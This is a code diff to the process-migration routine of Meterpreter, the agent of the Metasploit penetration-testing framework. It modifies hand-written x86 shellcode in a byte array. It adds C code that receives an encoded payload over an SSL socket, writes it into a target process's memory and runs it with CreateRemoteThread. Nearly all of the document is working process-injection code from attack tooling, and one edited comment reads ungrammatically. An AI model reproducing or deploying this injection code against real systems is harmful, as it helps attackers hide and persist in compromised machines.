@@ -620,12 +620,15 @@ DWORD remote_request_core_migrate(Remote *remote, Packet *packet)
 	DWORD threadId;
 	DWORD result = ERROR_SUCCESS;
 	DWORD pid;
+	PUCHAR payload;
+	DWORD payloadBytesLeft;
+	DWORD bytesRead;
 
 	// Bug fix for Ticket #275: recv the migrate payload into a RWX buffer instead of straight onto the stack (Stephen Fewer).
 	BYTE stub[] =
 		"\x8B\x74\x24\x04"         //  mov esi,[esp+0x4]         ; ESI = MigrationStubContext *
 		"\x89\xE5"                 //  mov ebp,esp               ; create stack frame
-		"\x81\xEC\x00\x10\x00\x00" //  sub esp, 0x1000           ; alloc space on stack
+		"\x81\xEC\x00\x40\x00\x00" //  sub esp, 0x4000            ; alloc space on stack
 		"\x8D\x4E\x20"             //  lea ecx,[esi+0x20]        ; ECX = MigrationStubContext->ws2_32
 		"\x51"                     //  push ecx                  ; push "ws2_32"
 		"\xFF\x16"                 //  call near [esi]           ; call loadLibrary
@@ -643,21 +646,10 @@ DWORD remote_request_core_migrate(Remote *remote, Packet *packet)
 		"\x97"                     //  xchg eax,edi              ; edi now = our duplicated socket
 		"\xFF\x76\x1C"             //  push dword [esi+0x1C]     ; push our event
 		"\xFF\x56\x18"             //  call near [esi+0x18]      ; call setevent
-		"\x8B\x5E\x08"             //  mov ebx,[esi+0x8]         ; buffer total length
-		"\x8B\x6E\x04"             //  mov ebp,[esi+0x4]         ; buffer address
-		"\x55"                     //  push ebp                  ; save address for return
-		"\x6A\x00"                 //  push byte +0x0            ; recv flags
-		"\x53"                     //  push ebx                  ; remaining length to read
-		"\x55"                     //  push ebp                  ; current buffer pointer
-		"\x57"                     //  push edi                  ; socket
-		"\xFF\x56\x14"             //  call dword near [esi+0x14]; recv
-		"\x01\xC5"                 //  add ebp,eax               ; buffer address += bytes received
-		"\x29\xC3"                 //  sub ebx,eax               ; remaining length -= bytes received
-		"\x85\xDB"                 //  test ebx,ebx              ; test remaining length
-		"\x75\xF0"                 //  jnz 0x7                   ; continue if we have more to read
-		"\xC3"                     //  ret                       ; return into the received buffer
-		"\x90\x90";                //  nop; nop;
-   
+		"\xFF\x76\x04"             //  push dword [esi+0x04]     ; push the address of the payloadBase
+		"\x59"                     //  pop ecx                   ; pop the address into a register
+		"\xFF\xD1";                //  call ecx                  ; call the payload
+
 	// Get the process identifier to inject into
 	pid = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_PID);
 
@@ -684,7 +676,7 @@ DWORD remote_request_core_migrate(Remote *remote, Packet *packet)
 
 	do
 	{
-		// Open the process so that we can duplicate shit into it
+		// Open the process so that we can into it
 		if (!(process = OpenProcess(
 				PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | 
 				PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid)))
@@ -726,7 +718,7 @@ DWORD remote_request_core_migrate(Remote *remote, Packet *packet)
 
 		strcpy(context.ws2_32, "ws2_32");
 
-		// Allocate storage for the stub and the context
+		// Allocate storage for the stub and context
 		if (!(dataBase = VirtualAllocEx(process, NULL, sizeof(MigrationStubContext) + sizeof(stub), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)))
 		{
 			result = GetLastError();
@@ -759,10 +751,47 @@ DWORD remote_request_core_migrate(Remote *remote, Packet *packet)
 		// successfully migrated and are reaching the point of no return
 		packet_transmit_response(result, remote, response);
 
+		// Receive the actual encoded payload over the SSL socket
+		if (!(payload = (PUCHAR)malloc(context.payloadLength)))
+		{
+			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
+			break;
+		}
+		
+		payloadBytesLeft = context.payloadLength;
+
+		// Read the payload
+		while (payloadBytesLeft > 0)
+		{
+			if ((bytesRead = ssl_read(&remote->ssl, 
+				payload + context.payloadLength - payloadBytesLeft, 
+					payloadBytesLeft)) <= 0)
+			{
+				if(bytesRead == POLARSSL_ERR_NET_TRY_AGAIN) continue;
+
+				if (GetLastError() == WSAEWOULDBLOCK)
+					continue;
+
+				if (!bytesRead)
+					SetLastError(ERROR_NOT_FOUND);
+
+				break;
+			}
+
+			payloadBytesLeft -= bytesRead;
+		}
+			
+		// Write this payload into the target process's memory
+		if (!WriteProcessMemory(process, context.payloadBase, payload, context.payloadLength, NULL))
+		{
+			result = GetLastError();
+			break;
+		}
+
 		response = NULL;
 
 		// Create the thread in the remote process
-		if (!(thread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)codeBase, dataBase, 0, &threadId)))
+		if (!(thread = CreateRemoteThread(process, NULL, 1024*1024, (LPTHREAD_START_ROUTINE)codeBase, dataBase, 0, &threadId)))
 		{
 			result = GetLastError();
 			break;
@@ -775,6 +804,7 @@ DWORD remote_request_core_migrate(Remote *remote, Packet *packet)
 			result = GetLastError();
 			break;
 		}
+		dprintf("Shutting down the Meterpreter thread...");
 
 		// Exit the current process now that we've migrated to another one
 		ExitThread(0);
